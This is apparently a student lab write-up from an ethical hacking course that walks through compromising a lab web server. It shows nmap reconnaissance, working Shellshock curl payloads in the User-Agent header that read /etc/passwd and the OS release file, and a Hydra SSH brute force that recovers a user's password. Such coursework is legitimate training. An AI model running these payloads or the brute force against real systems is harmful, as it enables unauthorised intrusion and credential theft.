# Exploiting Cupcake
## Part 1 - Active Recon (20 minutes)

The target is cupcake.shire.org at 10.0.5.23

What can you find out about the target?

```
└─$ sudo nmap -sS -sV 10.0.5.28

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.2.15 ((CentOS))
443/tcp open  ssl/http Apache httpd 2.2.15 ((CentOS))                                                            
```

- Apache webserver on port 80 & 443
- webpage on both HTTP and HTTPS, looks like same webpage though
- access to cgi-bin/status
<img width="769" height="179" alt="{9EBADD68-4D7F-434A-8227-C44995052946}" src="https://github.com/user-attachments/assets/8006144b-4a91-415b-89ae-3b13e3baf830" />

## Part 2 - Dealing with Targets and Scans (10 minutes)

- another way to get version info(this is more trustworthy than nmap): using 404 error message to check if there's publicly available information
<img width="496" height="220" alt="{B5FBB211-5A07-43C6-9EE5-27309C7E2D2E}" src="https://github.com/user-attachments/assets/081fa3a3-712e-4553-b1e1-d3c901fede64" />

- **Apache/2.2.15 (CentOS) Server at 10.0.5.28 Port 80**
- nmap OS version detection gave nothing useful


- Install nmaptocsv in virtual environment
```
sudo apt update
sudo python3 -m venv ~/.venv
source ~/.venv/bin/activate
sudo ~/.venv/bin/pip install nmaptocsv

┌──(.venv)─(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/week04]
└─$ sudo nmap -sS -sV 10.0.5.28 -oG cupcake.txt
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.2.15 ((CentOS))
443/tcp open  ssl/http Apache httpd 2.2.15 ((CentOS))
                                                                                                                                                            
┌──(.venv)─(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/week04]
└─$ nmaptocsv -i cupcake.txt -d ','
"IP","FQDN","PORT","PROTOCOL","SERVICE","VERSION"
"10.0.5.28","","80","tcp","http","Apache httpd 2.2.15 ((CentOS))"
"10.0.5.28","","443","tcp","ssl|http","Apache httpd 2.2.15 ((CentOS))"
```
<img width="787" height="103" alt="{0D3AF008-3A25-441A-8358-B4243C4695A2}" src="https://github.com/user-attachments/assets/ba30d2cc-ce27-44d9-b60f-a6284752d1cb" />


## Part 3 - Vulnerability Detection (10 Minutes)

### shellshock exploit
```
└─$ sudo nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/status,cmd="echo ; echo ; /user/bin/whoami" 10.0.5.28

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS))
|_http-server-header: Apache/2.2.15 (CentOS)
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     Exploit results:
|       
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
```
finding OS version
```
curl -H 'User-Agent: () { :; ); echo ; echo ; /bin/cat /etc/redhat-release' bash -s :'' http://10.0.5.28/cgi-bin/status

CentOS release 6.5 (Final)
```
dumping /etc/password
```
└─$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.0.5.28/cgi-bin/status
...
...
samwise:x:500:500::/home/samwise:/bin/bash
deployer:x:501:501::/home/deployer:/bin/bash
```
**samwise** is user account of interest

try to ssh, if you get the error message [Unable to negotiate with 10.0.5.28 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss] then you need to add these lines to `~/.ssh/config`
```
HostKeyAlgorithms +ssh-rsa
PubkeyAcceptedAlgorithms +ssh-rsa
```

finding potential passwords:

<img width="695" height="555" alt="{8A766DFE-3DB4-4A6D-B8D1-0CE49004E42B}" src="https://github.com/user-attachments/assets/51484ae4-6315-47f0-bfbf-e6aec0524ab1" />

## hydra
Hydra is a versatile tool for testing a variety of passwords against a service like ssh.
- `-l`: login (username)
- `-P`: password list
- `-t 4`: 4 tasks

```
hydra -l samwise -P samwisepasswords.txt 10.0.5.28 -t 4 ssh

[22][ssh] host: 10.0.5.28   login: samwise   password: SamwiseGamgee19
```
**SamwiseGamgee19** is the password


